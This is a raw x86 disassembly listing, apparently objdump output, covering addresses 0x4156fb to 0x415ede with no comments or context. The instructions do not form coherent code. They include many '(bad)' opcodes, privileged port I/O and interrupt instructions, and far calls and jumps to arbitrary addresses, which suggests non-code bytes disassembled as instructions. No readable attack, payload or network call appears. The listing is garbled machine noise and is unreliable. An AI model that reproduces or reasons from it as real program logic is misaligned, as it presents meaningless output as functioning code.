  4156fb:	pavgw  mm5,QWORD PTR [ebp+0x58d9ce76]
  415702:	mov    ecx,0x702f3782
  415707:	xchg   edx,eax
  415708:	stos   BYTE PTR es:[edi],al
  415709:	mov    eax,0x5b70b6d0
  41570e:	mov    esp,0x45095c67
  415713:	and    eax,0x2ba6291f
  415718:	addr16 cmp eax,ebp
  41571b:	dec    ebx
  41571c:	pop    edx
  41571d:	and    DWORD PTR [edx-0x48d3e73e],0xffffffb4
  415724:	pop    ds
  415725:	lods   eax,DWORD PTR ds:[esi]
  415726:	xor    BYTE PTR [ebx],cl
  415728:	pop    edx
  415729:	mov    al,ds:0x263c55dd
  41572e:	push   cs
  41572f:	dec    esp
  415730:	mov    al,0xf1
  415732:	(bad)  
  415733:	mov    dl,0xc2
  415735:	inc    esp
  415736:	adc    BYTE PTR [ebp+0x73],0x42
  41573a:	neg    DWORD PTR [edx-0x7e9b914c]
  415740:	js     0x4156d9
  415742:	ficom  WORD PTR [esi+edx*4+0x50cc552]
  415749:	inc    ebx
  41574a:	xlat   BYTE PTR ds:[ebx]
  41574b:	mov    esp,0xeae61f5e
  415750:	fimul  WORD PTR [edi]
  415752:	and    DWORD PTR [eax+0x3330d1ee],0x66473d9
  41575c:	test   eax,0x4739728d
  415761:	fisttp QWORD PTR [ecx+eax*2-0x2a]
  415765:	xchg   ecx,eax
  415766:	xor    DWORD PTR [esi-0x575f63b0],edx
  41576c:	ins    DWORD PTR es:[edi],dx
  41576d:	cld    
  41576e:	lahf   
  41576f:	cs inc ecx
  415771:	cmp    bh,dh
  415773:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415774:	and    al,0x2c
  415776:	add    eax,DWORD PTR ds:0x986ee756
  41577c:	adc    bh,BYTE PTR [esp+ebp*8+0x25]
  415780:	arpl   di,cx
  415782:	push   esi
  415783:	(bad)  
  415784:	(bad)  [edx+eax*1]
  415787:	or     BYTE PTR [eax+0x43],bl
  41578a:	repz and DWORD PTR [esi+0x50d92963],edi
  415791:	in     eax,dx
  415792:	xor    bl,cl
  415794:	pusha  
  415795:	jl     0x4157d8
  415797:	fdivp  st(3),st
  415799:	add    BYTE PTR [eax-0x16],ah
  41579c:	outs   dx,DWORD PTR ds:[esi]
  41579d:	lar    eax,WORD PTR [eax]
  4157a0:	cli    
  4157a1:	outs   dx,BYTE PTR ds:[esi]
  4157a2:	adc    ecx,DWORD PTR [edx]
  4157a4:	dec    ebp
  4157a5:	data16 and dl,ah
  4157a8:	mov    ah,0x21
  4157ab:	inc    edi
  4157ac:	aam    0xf
  4157ae:	repnz cmp esp,edi
  4157b1:	jns    0x415783
  4157b3:	cmc    
  4157b4:	mov    ch,0xaf
  4157b6:	add    BYTE PTR [ecx-0x2e],0x7
  4157ba:	inc    ebp
  4157bb:	test   eax,0xe2a1f479
  4157c0:	inc    esi
  4157c1:	and    al,0xca
  4157c3:	leave  
  4157c4:	mov    dh,0x22
  4157c6:	into   
  4157c7:	sti    
  4157c8:	aaa    
  4157c9:	dec    ecx
  4157ca:	sti    
  4157cb:	cdq    
  4157cc:	inc    esi
  4157cd:	aaa    
  4157ce:	call   0xcd54:0x11f82d75
  4157d5:	sti    
  4157d6:	mov    ch,0xef
  4157d8:	push   ds
  4157d9:	push   0xffffffd7
  4157db:	adc    ebx,esp
  4157dd:	bound  ebx,QWORD PTR [ebx-0x5a]
  4157e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4157e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4157e2:	mov    ds:0xf300d2d7,eax
  4157e7:	lahf   
  4157e8:	test   DWORD PTR [eax+0x1b],ebx
  4157eb:	rol    DWORD PTR [ebx-0x70f6f941],0x92
  4157f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4157f3:	sub    ah,ah
  4157f5:	jge    0x4157ef
  4157f7:	push   0x6c99cb9b
  4157fc:	mov    bl,0xc3
  4157fe:	fdivr  QWORD PTR [edi-0x79]
  415801:	in     al,0x41
  415803:	outs   dx,DWORD PTR ds:[esi]
  415804:	xchg   esp,eax
  415805:	mov    esi,0xdc08f760
  41580a:	xor    ebp,DWORD PTR [ecx+0x440c3b6d]
  415810:	pop    edi
  415811:	mov    ch,0xc0
  415813:	ss push eax
  415815:	(bad)  
  415816:	in     eax,dx
  415817:	clc    
  415818:	out    0x33,eax
  41581a:	and    eax,0xaf566444
  41581f:	pop    edi
  415820:	arpl   WORD PTR ds:0xa3706eab,ax
  415826:	jmp    0x41589a
  415828:	aad    0x98
  41582a:	cmc    
  41582b:	sbb    esp,DWORD PTR [eax+eax*1-0x7edbd53a]
  415832:	jno    0x415827
  415834:	fld    DWORD PTR [edi-0x69c06d6f]
  41583a:	mov    bh,0x6e
  41583c:	call   0x21f3:0x1a3566dc
  415843:	ins    DWORD PTR es:[edi],dx
  415844:	jns    0x4158a7
  415846:	rcr    dh,0xe6
  415849:	jns    0x4158c6
  41584b:	pop    esp
  41584c:	cmp    al,0x98
  41584e:	call   0x121:0x16ede65c
  415855:	jns    0x41583d
  415857:	(bad)  
  415858:	rol    BYTE PTR [ebx],1
  41585a:	mov    ch,0xc4
  41585c:	aaa    
  41585d:	jne    0x415826
  41585f:	out    0xc2,al
  415861:	dec    ecx
  415862:	mov    bh,0x7d
  415864:	scas   al,BYTE PTR es:[edi]
  415865:	ins    DWORD PTR es:[edi],dx
  415866:	or     DWORD PTR [esi],0x4c72ba17
  41586c:	aam    0x47
  41586e:	or     DWORD PTR [edx+0xc],edi
  415871:	xchg   ecx,eax
  415872:	dec    edi
  415873:	and    ebp,edi
  415875:	xchg   edx,eax
  415876:	cmp    BYTE PTR [ebp+0x66770519],bl
  41587c:	mov    ds:0x646b7eb9,al
  415881:	pop    eax
  415882:	add    DWORD PTR [ebp-0x7d],eax
  415885:	xor    DWORD PTR [ebx+0x7b],ebp
  415888:	pop    edx
  415889:	push   0xae33b528
  41588e:	xchg   edi,eax
  41588f:	repz adc DWORD PTR [esi+0x6d5507dc],ecx
  415896:	(bad)  
  415898:	(bad)  
  415899:	in     eax,dx
  41589a:	jae    0x4158b6
  41589c:	xor    BYTE PTR [ecx+0x74772ebb],ch
  4158a2:	sar    DWORD PTR [eax],1
  4158a4:	jo     0x41584b
  4158a6:	es mov bl,0x41
  4158a9:	in     al,0x2c
  4158ab:	out    dx,eax
  4158ac:	or     bh,BYTE PTR [edi+ebp*1]
  4158af:	aas    
  4158b0:	icebp  
  4158b1:	sar    DWORD PTR [esi],0x63
  4158b4:	push   ds
  4158b5:	int3   
  4158b6:	pop    ecx
  4158b7:	not    bh
  4158b9:	rol    BYTE PTR [ecx-0xd629a66],cl
  4158bf:	pop    ds
  4158c0:	and    BYTE PTR [esi-0x5e],dh
  4158c3:	pop    edx
  4158c4:	mov    ebp,0xc26bd500
  4158c9:	out    dx,eax
  4158ca:	(bad)  [ecx+0x38db65b2]
  4158d0:	inc    ecx
  4158d1:	cmp    esp,edx
  4158d3:	pop    ebx
  4158d4:	fisubr WORD PTR [esi+0x76]
  4158d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4158d8:	xor    BYTE PTR [ecx+edi*1+0x22],ah
  4158dc:	push   esp
  4158de:	dec    edx
  4158df:	xor    DWORD PTR [esi-0x13],ecx
  4158e2:	xlat   BYTE PTR ds:[ebx]
  4158e3:	xchg   edi,eax
  4158e4:	push   esi
  4158e5:	cmp    DWORD PTR [edx],ebp
  4158e7:	(bad)  
  4158e8:	or     al,BYTE PTR [eax-0x674256c9]
  4158ee:	arpl   di,sp
  4158f0:	les    esi,FWORD PTR [ecx]
  4158f2:	rcr    dh,cl
  4158f4:	cli    
  4158f5:	mov    esi,0x167c624a
  4158fa:	or     ebp,DWORD PTR [edi+0x7]
  4158fd:	add    bh,BYTE PTR [esi-0x2d22ee4c]
  415903:	and    edi,ebx
  415905:	scas   al,BYTE PTR es:[edi]
  415906:	xor    BYTE PTR [ebp+0x574ab1fe],dh
  41590c:	sub    dh,BYTE PTR [ebp+0x4bcf792a]
  415912:	test   BYTE PTR [ecx+0x3e],0xbc
  415916:	dec    edi
  415917:	(bad)  
  415918:	pop    ebx
  415919:	call   DWORD PTR ds:0x7e785328
  41591f:	pop    edx
  415920:	dec    ebx
  415921:	xor    ecx,ecx
  415923:	xchg   esp,eax
  415924:	pop    ebp
  415925:	adc    BYTE PTR [edx],0xf0
  415928:	sbb    eax,0xc9a095e8
  41592d:	xor    eax,0x39d8bc58
  415932:	int3   
  415933:	add    al,0x2d
  415935:	fcmovnu st,st(7)
  415937:	inc    DWORD PTR [esp+ebx*1-0x4cd5d192]
  41593e:	in     al,dx
  41593f:	lods   al,BYTE PTR ds:[esi]
  415940:	or     al,0xe3
  415942:	and    al,0xd2
  415944:	call   0x52654311
  415949:	mov    ebx,0x7b004d71
  41594e:	and    al,0x3a
  415950:	pop    eax
  415951:	push   esp
  415952:	inc    ebp
  415953:	in     al,0x73
  415955:	dec    edx
  415956:	mov    ebp,0x73a8dd91
  41595b:	pop    ecx
  41595c:	and    DWORD PTR [edx-0x12],edi
  41595f:	test   edx,esi
  415961:	add    al,0x32
  415963:	xchg   DWORD PTR [esi-0x29],ebp
  415966:	add    DWORD PTR [esi-0x43641e43],ebp
  41596c:	fadd   QWORD PTR [ecx-0x6e2a2d89]
  415972:	mov    esi,0xf7f99478
  415977:	push   es
  415978:	cmp    al,0x6b
  41597a:	test   al,0xfe
  41597c:	add    ch,0xfe
  41597f:	mov    esi,0x296c8e03
  415984:	sub    edi,DWORD PTR ds:0xb8aec22b
  41598a:	pushf  
  41598b:	iret   
  41598c:	jmp    0x4a858aee
  415991:	dec    eax
  415992:	push   esp
  415993:	dec    DWORD PTR [eax+0x68fa9b55]
  415999:	push   fs
  41599b:	out    dx,al
  41599c:	popa   
  41599d:	rcr    BYTE PTR [ebp+0x4ec3947c],cl
  4159a3:	cmp    eax,0xbcd6600e
  4159a8:	shr    al,0x47
  4159ab:	fnstsw WORD PTR [edi]
  4159ad:	add    BYTE PTR [ebx+0x7a],cl
  4159b0:	sbb    DWORD PTR [ecx-0x30ef0ded],0xffffffd5
  4159b7:	xchg   DWORD PTR [ebp-0x240fb34f],ebp
  4159bd:	sub    dl,BYTE PTR [ebp-0x1b9e1279]
  4159c3:	inc    edi
  4159c4:	sti    
  4159c5:	push   0x5027fe44
  4159ca:	mov    ch,0xd2
  4159cc:	sbb    edi,DWORD PTR [ebp-0x28]
  4159cf:	cld    
  4159d0:	xchg   edx,eax
  4159d1:	cmc    
  4159d2:	stc    
  4159d3:	ja     0x4159dd
  4159d5:	or     eax,0x816283cc
  4159da:	daa    
  4159db:	ins    BYTE PTR es:[edi],dx
  4159dc:	rcr    DWORD PTR [ebp+0x2],1
  4159df:	stos   BYTE PTR es:[edi],al
  4159e0:	sbb    eax,0x353135d3
  4159e5:	jmp    FWORD PTR [edi-0x46]
  4159e8:	les    ebp,FWORD PTR [edi+0x6f]
  4159eb:	xchg   ecx,eax
  4159ec:	retf   0x2026
  4159ef:	sbb    al,0xf3
  4159f1:	mov    ebx,0xb9821e05
  4159f6:	int    0x36
  4159f8:	mov    ebp,0x9387aed8
  4159fd:	jp     0x4159f9
  4159ff:	jae    0x415a67
  415a01:	push   ecx
  415a02:	pop    ebx
  415a03:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415a04:	dec    ecx
  415a05:	and    bh,BYTE PTR [ecx-0xe]
  415a08:	push   ecx
  415a09:	dec    ebx
  415a0a:	jae    0x415a49
  415a0c:	and    eax,0xb5338dfc
  415a11:	and    cl,BYTE PTR [eax-0x77ecbfdb]
  415a17:	xchg   esi,eax
  415a18:	idiv   eax
  415a1a:	dec    edx
  415a1b:	repnz xchg ebp,eax
  415a1d:	cmp    DWORD PTR [esp+edx*4-0x22e1c68e],0xf9cec456
  415a28:	and    al,0x2c
  415a2a:	mov    DWORD PTR [esi-0x7d04cac9],ecx
  415a30:	std    
  415a31:	push   ebx
  415a32:	add    eax,DWORD PTR [ecx-0x2b97ed29]
  415a38:	mov    esp,0xa5167ec
  415a3d:	les    edi,FWORD PTR [edx-0x765dfd25]
  415a43:	xor    DWORD PTR [eax+edi*2+0x4a022b51],edi
  415a4a:	fnstcw WORD PTR [edi+0x4a]
  415a4d:	jmp    0x415a05
  415a4f:	clc    
  415a50:	cmp    edi,ecx
  415a52:	mov    eax,ds:0xa73c718e
  415a57:	clc    
  415a58:	loopne 0x4159e2
  415a5a:	sub    esi,DWORD PTR [esi]
  415a5c:	dec    eax
  415a5d:	imul   esi,DWORD PTR [bp+di-0x264],0x7fddf16b
  415a66:	mov    eax,ds:0xcd5ccff7
  415a6b:	add    ebp,0x34
  415a6e:	fcmovu st,st(3)
  415a70:	dec    eax
  415a71:	push   eax
  415a72:	or     al,0x3a
  415a74:	dec    esp
  415a75:	pop    ebx
  415a76:	sub    al,0xe8
  415a78:	adc    dh,BYTE PTR [eax+0x66]
  415a7b:	gs das 
  415a7d:	fcom   QWORD PTR [eax-0x683fad8a]
  415a83:	xchg   ebp,eax
  415a84:	push   ss
  415a85:	push   esp
  415a86:	pop    ss
  415a87:	ja     0x415a0a
  415a89:	inc    esp
  415a8a:	mov    esp,0x9cf247a7
  415a8f:	sahf   
  415a90:	xchg   ebp,eax
  415a91:	push   ds
  415a92:	imul   esi,DWORD PTR [edi],0x5
  415a95:	pop    esp
  415a96:	sub    DWORD PTR [ecx-0x21],ecx
  415a99:	jge    0x415a73
  415a9b:	jnp    0x415a3b
  415a9d:	pop    ss
  415a9e:	inc    ecx
  415a9f:	out    dx,al
  415aa0:	mov    edx,0xa2e344d6
  415aa5:	enter  0xfe28,0xc5
  415aa9:	fcmovnb st,st(4)
  415aab:	dec    edx
  415aac:	cld    
  415aad:	imul   eax,DWORD PTR [edi+ebx*1-0x7b],0xa3655c28
  415ab5:	cdq    
  415ab6:	inc    edi
  415ab7:	out    dx,al
  415ab8:	fwait
  415ab9:	cmp    eax,DWORD PTR [edi+0x4a]
  415abc:	dec    edi
  415abd:	xor    cl,BYTE PTR [ecx+eiz*2]
  415ac0:	pop    ebp
  415ac1:	xchg   ecx,eax
  415ac2:	ins    BYTE PTR es:[edi],dx
  415ac3:	sub    BYTE PTR [eax-0x27],ch
  415ac6:	or     ecx,DWORD PTR [ebx+0x73ad6505]
  415acc:	mov    esp,0x81d9ad58
  415ad1:	dec    edi
  415ad2:	stc    
  415ad3:	push   edi
  415ad4:	push   ebx
  415ad5:	shl    DWORD PTR [edi+0x5151efc4],cl
  415adb:	icebp  
  415adc:	outs   dx,BYTE PTR ds:[esi]
  415add:	xor    ch,dh
  415adf:	pop    ebp
  415ae0:	stc    
  415ae1:	mov    BYTE PTR [eax],dh
  415ae3:	test   ecx,edx
  415ae5:	rcr    dh,0xee
  415ae8:	add    eax,0x91f16af5
  415aed:	add    eax,0x22512755
  415af2:	in     eax,0xe0
  415af4:	test   ah,ah
  415af6:	sub    dl,BYTE PTR fs:[edi+0x9]
  415afa:	xor    al,0x82
  415afc:	xor    al,0xb8
  415afe:	sbb    BYTE PTR [ebx-0x5c48a95],dl
  415b04:	das    
  415b05:	mov    edi,0x444e4f18
  415b0a:	push   eax
  415b0b:	jl     0x415ab5
  415b0d:	retf   
  415b0e:	xor    DWORD PTR ds:0xd4b696d0,ebx
  415b14:	xlat   BYTE PTR ds:[ebx]
  415b15:	jge    0x415b4e
  415b17:	inc    ebx
  415b18:	cli    
  415b19:	scas   al,BYTE PTR es:[edi]
  415b1a:	mov    esi,0x4daea3d2
  415b1f:	test   al,0xbe
  415b21:	aas    
  415b22:	loop   0x415b0f
  415b24:	mov    cl,0xfa
  415b26:	imul   eax,DWORD PTR [edx+0x67],0xffffffea
  415b2a:	push   0xffffffdd
  415b2c:	daa    
  415b2d:	inc    ecx
  415b2e:	popf   
  415b2f:	mov    eax,ds
  415b31:	and    bl,BYTE PTR [esi-0x5a]
  415b34:	imul   edx,DWORD PTR [edx],0xeba9799
  415b3a:	xchg   edi,eax
  415b3b:	xchg   BYTE PTR [edx-0x3a0ee782],ch
  415b41:	adc    DWORD PTR [ebp-0x107e2610],esi
  415b47:	fnstenv [edx+ecx*4]
  415b4a:	dec    esp
  415b4b:	mov    eax,ds:0x6d09bede
  415b50:	or     al,0xdb
  415b52:	jo     0x415af2
  415b54:	popa   
  415b55:	pusha  
  415b56:	mov    esp,0x424bc5e5
  415b5b:	mov    ch,0xd2
  415b5d:	xchg   edi,eax
  415b5e:	int    0x5e
  415b60:	pop    eax
  415b61:	cmp    edx,DWORD PTR [ecx-0x54fc738e]
  415b67:	gs (bad) 
  415b69:	test   al,0xe0
  415b6b:	xchg   esp,eax
  415b6c:	ror    BYTE PTR ds:0x471ddaf5,cl
  415b72:	add    edx,eax
  415b74:	jbe    0x415b49
  415b76:	test   DWORD PTR gs:[edx-0x4d],ecx
  415b7a:	mov    dh,0xdf
  415b7c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415b7d:	and    eax,0x5184f160
  415b82:	clc    
  415b83:	popf   
  415b84:	ds add eax,0x171fa3e0
  415b8a:	fstp   TBYTE PTR [edx+0x12bde207]
  415b90:	and    al,0x36
  415b92:	cs mov cl,0xc7
  415b95:	int    0xc8
  415b97:	sbb    dh,BYTE PTR [esp+ecx*8]
  415b9a:	in     eax,0x8f
  415b9c:	call   0xb9689dc0
  415ba1:	mov    al,BYTE PTR [edx-0x2bc5263d]
  415ba7:	repz sub DWORD PTR [eax+0x4f59d9bd],0xffffffba
  415baf:	retf   0xa7eb
  415bb2:	imul   ebp,DWORD PTR [edi+0x0],0x3f54e424
  415bb9:	popf   
  415bba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415bbb:	pop    esi
  415bbc:	jge    0x415bc1
  415bbe:	iret   
  415bbf:	ss sbb eax,0x29e1bb0f
  415bc5:	mov    ebx,0x69a50790
  415bca:	out    0x6f,al
  415bcc:	mov    ?,WORD PTR gs:[edx]
  415bcf:	test   BYTE PTR [ecx-0x8],ch
  415bd2:	mov    esp,0x10393aef
  415bd7:	jne    0x415bb9
  415bd9:	xor    dl,ch
  415bdb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415bdc:	lea    edi,[ecx+0x72]
  415bdf:	test   al,0x3b
  415be1:	push   ebp
  415be2:	xchg   ebx,edi
  415be4:	repz push ds
  415be6:	dec    edi
  415be7:	xchg   esi,eax
  415be8:	std    
  415be9:	mov    edx,0xa3265dc9
  415bee:	mov    dl,dl
  415bf0:	and    al,ch
  415bf2:	(bad)  
  415bf3:	aas    
  415bf4:	daa    
  415bf5:	arpl   WORD PTR [ebx-0xa5f0757],sp
  415bfb:	sub    al,0xb0
  415bfd:	cs jns 0x415c13
  415c00:	sbb    BYTE PTR [ebx-0x28],dl
  415c03:	stos   DWORD PTR es:[edi],eax
  415c04:	sbb    al,BYTE PTR [ecx+0x5a]
  415c07:	mov    esp,0xc38234
  415c0c:	dec    esi
  415c0d:	sti    
  415c0e:	pop    ebx
  415c0f:	sti    
  415c10:	push   edx
  415c11:	stc    
  415c12:	mov    dh,0xf9
  415c14:	xor    cl,ch
  415c16:	(bad)  
  415c17:	sbb    ecx,DWORD PTR [eax+0x3cfcc439]
  415c1d:	ds push ecx
  415c1f:	xchg   esp,eax
  415c20:	sahf   
  415c21:	jmp    0x7cbc3a0f
  415c26:	mov    ch,0x73
  415c28:	jno    0x415bfd
  415c2a:	in     al,dx
  415c2b:	mov    ds:0xb4acdfc,eax
  415c30:	sub    esp,edi
  415c32:	pop    esp
  415c33:	lfs    ecx,FWORD PTR [edx-0x5ed34495]
  415c3a:	inc    edi
  415c3b:	push   esp
  415c3c:	stos   BYTE PTR es:[edi],al
  415c3d:	nop
  415c3e:	xchg   ebp,eax
  415c3f:	pop    ebp
  415c40:	or     ecx,ebp
  415c42:	fmul   DWORD PTR [esi+0x29]
  415c45:	(bad)  
  415c46:	gs and eax,0xae96024
  415c4c:	cmp    BYTE PTR [edx+esi*2],dl
  415c4f:	fwait
  415c50:	push   ss
  415c51:	push   ss
  415c52:	jns    0x415cac
  415c54:	bound  esp,QWORD PTR [esi+0x4652a98d]
  415c5a:	push   0xc8d1de89
  415c5f:	fimul  DWORD PTR [ebx+0x38]
  415c62:	push   ss
  415c63:	push   edi
  415c64:	out    dx,eax
  415c65:	xor    edx,DWORD PTR [ebp+esi*1-0x7ecebfbc]
  415c6c:	fbstp  TBYTE PTR [ebx+ebx*2]
  415c6f:	dec    ebp
  415c70:	test   eax,0xbcb1325a
  415c75:	add    ch,BYTE PTR [esi+0x34dd0d60]
  415c7b:	jl     0x415c9b
  415c7d:	pop    edx
  415c7e:	xchg   edi,eax
  415c7f:	arpl   WORD PTR [ecx-0x26ccc012],di
  415c85:	std    
  415c86:	dec    ebx
  415c87:	into   
  415c88:	aas    
  415c89:	fld    TBYTE PTR ds:0x9e3f5e8d
  415c8f:	push   es
  415c90:	jne    0x415c13
  415c92:	lods   al,BYTE PTR ds:[esi]
  415c93:	mov    esp,ecx
  415c95:	push   0xea7be32d
  415c9a:	shl    BYTE PTR [edi],cl
  415c9c:	pop    edx
  415c9d:	cmp    al,0x4f
  415c9f:	xor    al,0x80
  415ca1:	lods   eax,DWORD PTR ds:[esi]
  415ca2:	jle    0x415ceb
  415ca4:	xchg   BYTE PTR [edi],ah
  415ca6:	and    eax,0x74f2f56e
  415cab:	pop    edx
  415cac:	pop    ebp
  415cad:	push   eax
  415cae:	call   0x4e7e2a25
  415cb3:	push   esp
  415cb4:	dec    ebp
  415cb5:	xor    cl,dl
  415cb7:	push   ecx
  415cb8:	stos   DWORD PTR es:[edi],eax
  415cb9:	xchg   edx,eax
  415cba:	jmp    0x415d03
  415cbc:	loope  0x415c3f
  415cbe:	push   ebp
  415cbf:	call   FWORD PTR [ebx]
  415cc1:	mov    esp,0x380f990e
  415cc6:	xor    al,0x13
  415cc8:	ficom  WORD PTR cs:[edx-0xf]
  415ccc:	lods   al,BYTE PTR ds:[esi]
  415ccd:	inc    edi
  415cce:	loope  0x415cb9
  415cd0:	or     bh,dl
  415cd2:	cmp    eax,0xe4ccc1c
  415cd7:	out    dx,al
  415cd8:	xchg   esi,eax
  415cd9:	mov    WORD PTR [ebx+0x77],?
  415cdc:	bnd jne 0x415ce0
  415cdf:	push   ebp
  415ce0:	sub    cl,bh
  415ce2:	jae    0x415d0d
  415ce4:	(bad)  
  415ce5:	(bad)  
  415ce6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415ce7:	and    al,0xf0
  415ce9:	push   cs
  415cea:	in     al,0xad
  415cec:	(bad)  
  415ced:	mov    ds:0x5868dd6d,eax
  415cf2:	popf   
  415cf3:	test   eax,0xd9d98619
  415cf9:	mov    WORD PTR [di],cs
  415cfc:	cmpxchg bh,dh
  415cff:	ffreep st(1)
  415d01:	sbb    al,0xd8
  415d03:	scas   eax,DWORD PTR es:[edi]
  415d04:	mov    ds:0xbc32ca0f,eax
  415d09:	imul   ebp,DWORD PTR [edx],0x34
  415d0c:	add    eax,0xe8264332
  415d11:	call   0x430f:0xf12c8970
  415d18:	(bad)  
  415d1a:	fcomp  DWORD PTR [edi-0x592366f0]
  415d20:	nop
  415d21:	mov    al,BYTE PTR ds:0xab0b057d
  415d27:	inc    esi
  415d28:	cmp    bh,al
  415d2a:	xor    BYTE PTR [edi+0xa49af3f],cl
  415d30:	sub    cl,BYTE PTR [eax+0x77]
  415d33:	ins    DWORD PTR es:[edi],dx
  415d34:	or     eax,DWORD PTR [ebx]
  415d36:	fld    DWORD PTR [eax+0x17481166]
  415d3c:	mov    eax,ds:0x69667956
  415d41:	bound  ebx,QWORD PTR [edi-0x2c]
  415d44:	push   ds
  415d45:	(bad)  
  415d47:	xchg   ebx,eax
  415d48:	push   esi
  415d49:	xor    eax,0xbda5b31b
  415d4e:	jp     0x415ce6
  415d50:	jmp    0xe0a8eaeb
  415d55:	fwait
  415d56:	sbb    bl,BYTE PTR [esi]
  415d58:	xor    DWORD PTR [ecx+edi*4],eax
  415d5b:	(bad)  
  415d5c:	xlat   BYTE PTR ds:[ebx]
  415d5d:	(bad)  
  415d5e:	(bad)  
  415d5f:	mov    ds,ebp
  415d61:	lahf   
  415d62:	jbe    0x415d02
  415d64:	mov    ebx,0x8f617852
  415d69:	addr16 mov ecx,0xf79043c3
  415d6f:	jg     0x415d60
  415d71:	push   ecx
  415d72:	(bad)  
  415d73:	jmp    0x5b339ebe
  415d78:	sbb    ch,BYTE PTR [esi+ebx*4]
  415d7b:	scas   eax,DWORD PTR es:[edi]
  415d7c:	mov    BYTE PTR [edx-0x18eba72],bh
  415d82:	jecxz  0x415d3d
  415d84:	add    edx,esp
  415d86:	pop    ebx
  415d87:	mov    eax,ds:0x9baeff8c
  415d8c:	fdivr  st(1),st
  415d8e:	sahf   
  415d8f:	call   0xc88e:0x754b5359
  415d96:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415d97:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415d98:	mov    BYTE PTR [ebx-0x195ba2a3],dl
  415d9e:	push   ebp
  415d9f:	stos   DWORD PTR es:[edi],eax
  415da0:	shl    ebp,0x22
  415da3:	mov    eax,0xfa2db26a
  415da8:	fs cli 
  415daa:	pop    eax
  415dab:	in     eax,0xa2
  415dad:	sub    BYTE PTR [edi-0x49],cl
  415db0:	rol    DWORD PTR [ebx+ecx*2+0x6cb80a8c],0xd4
  415db8:	data16 into 
  415dba:	inc    edx
  415dbb:	jle    0x415e2a
  415dbd:	inc    esi
  415dbe:	jo     0x415dcc
  415dc0:	fild   DWORD PTR [ecx-0x25ae2705]
  415dc6:	sbb    BYTE PTR [ecx-0x56],0x3d
  415dca:	ss inc bp
  415dcd:	inc    esi
  415dce:	xor    BYTE PTR [edx+0x79],ch
  415dd1:	loop   0x415d75
  415dd3:	xchg   ecx,eax
  415dd4:	inc    eax
  415dd5:	xor    DWORD PTR [esi],0xffffff91
  415dd8:	inc    esi
  415dd9:	dec    ebx
  415dda:	call   0x771af7dc
  415ddf:	test   BYTE PTR [ecx+0x2d06110f],dl
  415de5:	hlt    
  415de6:	mov    bh,BYTE PTR [edx-0x53]
  415de9:	test   eax,0xcd2f7e74
  415dee:	fidiv  WORD PTR [edi]
  415df0:	stc    
  415df1:	inc    ebx
  415df2:	push   ds
  415df3:	cdq    
  415df4:	and    DWORD PTR [eax+0x8],ecx
  415df7:	sub    BYTE PTR [edi+esi*4-0x18cd89cb],bl
  415dfe:	and    ebp,DWORD PTR [ebx+0x27a55495]
  415e04:	mov    edx,0x661bc108
  415e09:	pop    esi
  415e0a:	dec    edi
  415e0b:	repz or eax,0xfcc95590
  415e11:	xchg   esp,eax
  415e12:	push   ecx
  415e13:	push   ebx
  415e14:	test   DWORD PTR [esi],ebx
  415e16:	pop    ebx
  415e17:	call   0x5c601ea
  415e1c:	stc    
  415e1d:	inc    esp
  415e1e:	ss fidiv WORD PTR gs:[ebp-0x6c]
  415e23:	mov    WORD PTR [ebp+0x9],es
  415e26:	aam    0xd0
  415e28:	push   edi
  415e29:	call   0x6b278214
  415e2e:	nop
  415e2f:	push   es
  415e30:	mov    bl,0xfc
  415e32:	xor    BYTE PTR [ebx+ebp*2+0x10267d75],ah
  415e39:	addr16 pop edi
  415e3b:	shl    DWORD PTR [ecx-0x5c],cl
  415e3e:	loope  0x415eaa
  415e40:	pushf  
  415e41:	xor    DWORD PTR [edx+0x2279d22f],0x5b
  415e48:	sbb    al,0xc9
  415e4a:	data16 int3 
  415e4c:	bound  edi,QWORD PTR [ebx+0x4c2ccdde]
  415e52:	push   0x8cd5f4e6
  415e57:	and    cl,BYTE PTR [ecx+edx*4]
  415e5a:	inc    edx
  415e5b:	xchg   esi,eax
  415e5c:	ror    ebx,1
  415e5e:	popa   
  415e5f:	fdivrp st(5),st
  415e61:	mov    edi,0xa617ddd0
  415e66:	jmp    0x415e1e
  415e68:	call   0x831852cb
  415e6d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415e6e:	ror    DWORD PTR [esi+0x7],cl
  415e71:	add    ah,dl
  415e73:	dec    edx
  415e74:	add    eax,0x5ae8356a
  415e79:	sub    cl,dh
  415e7b:	inc    eax
  415e7c:	call   0xa4f7d6c4
  415e81:	div    BYTE PTR [ecx+edi*4-0x634fbc37]
  415e88:	sbb    ebx,DWORD PTR [ebx]
  415e8a:	adc    eax,0xbb871a4b
  415e8f:	mov    WORD PTR [ebp+0x498de5f7],cs
  415e95:	loop   0x415e9c
  415e97:	push   ecx
  415e98:	mov    ah,0xd0
  415e9a:	es jo  0x415e1e
  415e9d:	sbb    DWORD PTR [ebp-0x57f458fb],0x14fc9bcc
  415ea7:	lods   eax,DWORD PTR ds:[esi]
  415ea8:	xor    dl,BYTE PTR [edi]
  415eaa:	dec    ecx
  415eab:	add    dh,cl
  415ead:	sbb    eax,0xd859aed3
  415eb2:	sti    
  415eb3:	iret   
  415eb4:	inc    esi
  415eb5:	xor    al,cl
  415eb7:	(bad)  
  415eb8:	(bad)  
  415eb9:	jle    0x415e62
  415ebb:	inc    esi
  415ebc:	push   esp
  415ebd:	sbb    al,0xb6
  415ebf:	js     0x415ede
  415ec1:	adc    DWORD PTR [esi-0x1685ba29],esp
  415ec7:	ds pop ecx
  415ec9:	fwait
  415eca:	rcr    BYTE PTR [edi-0x73155235],0x86
  415ed1:	xchg   edi,eax
  415ed2:	frndint 
  415ed4:	pop    eax
  415ed5:	dec    ebp
  415ed6:	mov    esi,0xae722f59
  415edb:	cld    
  415edc:	arpl   WORD PTR [ebx],di
  415ede:	mov    eax,ds:0xcaf8a71a
